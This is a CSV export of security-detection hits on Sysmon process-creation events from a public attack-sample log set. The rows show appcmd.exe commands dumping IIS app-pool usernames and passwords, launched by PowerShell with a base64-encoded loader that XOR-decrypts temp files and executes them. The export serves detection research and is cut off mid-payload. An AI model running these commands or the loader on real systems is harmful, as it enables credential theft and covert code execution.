2019-05-27T01:29:18.041809+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5910,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2472
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00104C83FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.011
"
2019-05-27T01:29:18.121924+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5913,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2896
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00100C87FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.081
"
2019-05-27T01:29:18.202039+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5916,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2524
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-0010CC8AFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.161
"
2019-05-27T01:29:18.282154+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5919,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3144
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00108C8EFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.232
"
2019-05-27T01:29:18.352255+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5922,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJ